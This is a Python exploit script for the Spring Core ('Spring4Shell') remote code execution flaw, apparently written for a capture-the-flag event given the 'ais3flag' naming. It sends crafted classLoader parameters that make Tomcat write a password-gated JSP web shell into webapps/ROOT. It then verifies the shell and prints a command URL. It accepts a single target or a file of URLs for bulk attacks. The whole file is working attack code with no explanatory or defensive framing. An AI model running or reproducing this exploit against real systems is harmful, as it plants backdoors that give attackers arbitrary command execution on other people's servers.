#coding:utf-8

import requests
import argparse
from urllib.parse import urljoin

def Exploit(url):
    headers = {"suffix":"%>//",
                "c1":"Runtime",
                "c2":"<%",
                "DNT":"1",
                "Content-Type":"application/x-www-form-urlencoded"

    }
    # class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{c2}i 
    Pattern1 = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20"
    # if("ais3flag".equals(request.getParameter("pwd"))){ java.io.InputStream in = %{c1}i.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } } %{suffix}i
    command = "if%28%22ais3flag%22.equals%28request.getParameter%28%22pwd%22%29%29%29%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime%28%29.exec%28request.getParameter%28%22cmd%22%29%29.getInputStream%28%29%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while%28%28a%3Din.read%28b%29%29%21%3D-1%29%7B%20out.println%28new%20String%28b%29%29%3B%20%7D%20%7D%20%25%7Bsuffix%7Di"
    # &class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp
    Pattern2 = "&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp"
    # &class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT
    Pattern3 = "&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT"
    # &class.module.classLoader.resources.context.parent.pipeline.first.prefix=ais3flag
    Pattern4 = "&class.module.classLoader.resources.context.parent.pipeline.first.prefix=ais3flag"
    # &class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
    Pattern5 = "&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
    
    data = Pattern1 + command + Pattern2 + Pattern3 + Pattern4 + Pattern5
    
    try:
        go = requests.post(url,headers=headers,data=data,timeout=15,allow_redirects=False, verify=False)
        print(go)
        shellurl = urljoin(url, 'ais3flag.jsp')
        shellgo = requests.get(shellurl,timeout=15,allow_redirects=False, verify=False)
        print(shellgo.status_code)
        if shellgo.status_code == 200:
            print(f"address:{shellurl}?pwd=ais3flag&cmd=ls")
        else:
            print(f"Attack Fail no repsponse{shellurl}")
    except Exception as e:
        #print(e)
        print("123")
        pass


def main():
    parser = argparse.ArgumentParser(description='Srping-Core Rce.')
    parser.add_argument('--file',help='url file',required=False)
    parser.add_argument('--url',help='target url',required=False)
    args = parser.parse_args()
    if args.url:
        Exploit(args.url)
    if args.file:
        with open (args.file) as f:
            for i in f.readlines():
                i = i.strip()
                Exploit(i)

if __name__ == '__main__':
    main()